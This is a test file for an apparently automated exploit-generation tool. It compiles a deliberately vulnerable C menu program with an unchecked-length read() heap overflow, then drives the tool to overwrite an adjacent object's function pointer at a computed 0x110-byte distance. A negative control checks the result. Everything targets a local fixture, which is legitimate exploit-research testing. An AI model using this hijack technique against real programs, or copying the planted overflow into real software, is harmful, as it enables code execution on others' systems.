"""The autopilot's COMPUTED-distance adjacent-overflow hijack (doc 58).

`chain_primitive._search_hijack` brute-walks overflow offsets only up to 64 bytes, so a large
overflow buffer -- whose victim chunk sits `request2size(size)` bytes on -- is out of its reach
entirely. `_computed_adjacent_hijack` closes that gap: it lets `heap_groom` pick the allocation
size and compute the EXACT adjacency distance, then detonates straight at it over the target's own
menu, confirmed by the same INT3 oracle + negative control (0-false-confirmation).

This builds a non-PIE line-driven menu fixture whose overflow buffer is malloc(0x100) -- its
victim's code pointer is 0x110 bytes away, four times past the brute window -- and drives the
wired helper with a REAL ptrace capture, proving it reaches the far victim where the brute search
provably cannot. Building a fixture in dev/benchmark is allowed (the air-gap constraint is on the
SHIPPED tool).
"""
import json
import shutil
import subprocess
import sys

import pytest

from lykos.analyze.poc import chain_primitive
from lykos.analyze.poc.capture import make_capture, materialize_helper
from lykos.analyze.poc.heap import request2size

# A line-driven number menu: one fgets+strtol per field (exactly the cadence lykos's menu driver
# emits -- a scalar, newline-terminated, per field), and an exact-length read() for the overflow
# so no stray newline desyncs the trigger. Options: 1 alloc(idx,size) · 2 make-object(idx) with an
# inline callback at offset 0 · 3 edit(idx,len)+raw bytes (unchecked -> heap overflow) · 4 use(idx)
# (calls the object's callback) · else quit.
_FIXTURE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ _exit(42); }
void benign(void){ }
struct obj { void (*fp)(void); char tag[8]; };
void *slots[16];
static long rdl(void){ char b[64]; if(!fgets(b,sizeof b,stdin)) exit(0); return strtol(b,0,10); }
int main(void){
    char cmd[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    while (fgets(cmd, sizeof cmd, stdin)) {
        long c = strtol(cmd, 0, 10);
        if (c == 1) { long idx = rdl(); long size = rdl(); slots[idx] = malloc(size); }
        else if (c == 2) { long idx = rdl();
            struct obj *o = malloc(sizeof *o); o->fp = benign; slots[idx] = o; }
        else if (c == 3) { long idx = rdl(); long n = rdl();
            if (read(0, slots[idx], n) < 0) return 1; }      /* unchecked length -> overflow */
        else if (c == 4) { long idx = rdl(); struct obj *o = slots[idx]; o->fp(); }
        else break;
    }
    return 0;
}
"""


class _Ctx:
    """The minimal context `make_capture` and `_computed_adjacent_hijack` touch: a subprocess
    runner, a cancel flag, and a progress sink."""
    def run_subprocess(self, argv, timeout=None):
        return subprocess.run(argv, capture_output=True, timeout=timeout)

    def should_cancel(self):
        return False

    def progress(self, **kw):
        pass


def _win_vaddr(exe):
    out = subprocess.check_output(["nm", str(exe)], text=True)
    for ln in out.splitlines():
        parts = ln.split()
        if len(parts) == 3 and parts[2] == "win":
            return int(parts[0], 16)
    raise AssertionError("win symbol not found")


@pytest.mark.skipif(not shutil.which("gcc") or not shutil.which("nm"),
                    reason="needs gcc + nm to build the fixture")
def test_computed_hijack_reaches_victim_past_the_brute_window(tmp_path):
    src = tmp_path / "menu.c"
    src.write_text(_FIXTURE)
    exe = tmp_path / "menu"
    r = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0",
                        "-o", str(exe), str(src)], capture_output=True, text=True)
    if r.returncode != 0:
        pytest.skip(f"fixture build failed: {r.stderr[:200]}")
    exe.chmod(0o755)

    win = _win_vaddr(exe)
    # The overflow buffer is malloc(0x100); its victim's code pointer is request2size(0x100) bytes
    # on -- FAR past _search_hijack's 8..64-byte brute walk, so only the computed path reaches it.
    assert request2size(0x100) == 0x110
    assert request2size(0x100) > 64

    # The crawled op-model the live stage would derive for this menu (built here directly so the
    # test does not depend on the string/menu crawler -- the stage supplies the same shape).
    opts = ["1", "2", "3", "4"]
    model = {"1": ["idx", "num"], "2": ["idx"], "3": ["idx", "num"], "4": ["idx"]}

    ctx = _Ctx()
    helper = materialize_helper()
    try:
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        found = chain_primitive._computed_adjacent_hijack(ctx, capture, opts, model, None, win)
    finally:
        shutil.rmtree(helper.parent, ignore_errors=True)

    assert found is not None, "computed-distance hijack failed to reach the far victim"
    seq, buf_opt, obj_opt, writer, dist, trig = found
    assert buf_opt == "1"           # the sized allocator is the overflow buffer
    assert obj_opt == "2"           # option 2 makes the object with the inline callback
    assert writer == "3"            # option 3 is the unchecked overflow
    assert trig == "4"              # option 4 calls the hijacked pointer
    assert dist == 0x110            # request2size(0x100) + fptr_off(0) -- the EXACT distance

    # Prove the oracle has teeth: the negative control (one word short) must NOT reach win on its
    # own, so the positive result can only be our overwrite.
    from lykos.analyze.poc import exploit, heap_groom
    from lykos.analyze.fuzz import menu
    plan = heap_groom.plan_adjacent_overflow(0x100, win, obj_fptr_off=0)
    spec = heap_groom.MenuSpec(
        alloc_buf=lambda sz: menu._scalar(b"1", None) + menu._fill(model["1"], idx=b"0",
                                                                   num=str(sz).encode(), width=None),
        alloc_obj=lambda: menu._scalar(b"2", None) + menu._fill(model["2"], idx=b"1", width=None),
        edit_buf=lambda data: (menu._scalar(b"3", None) + menu._scalar(b"0", None)
                               + menu._scalar(str(len(data)).encode(), None)
                               + menu._data(data, None, term=False)),
        trigger=lambda: menu._scalar(b"4", None) + menu._fill(model["4"], idx=b"1", width=None),
    )
    helper2 = materialize_helper()
    try:
        cap = make_capture(ctx, helper2, str(exe), "stdin", [], 8, sys.executable)
        neg = heap_groom.lower(plan, spec, negative=True)
        assert exploit.reached(cap(neg, breakpoints=[win]), win) is False
    finally:
        shutil.rmtree(helper2.parent, ignore_errors=True)
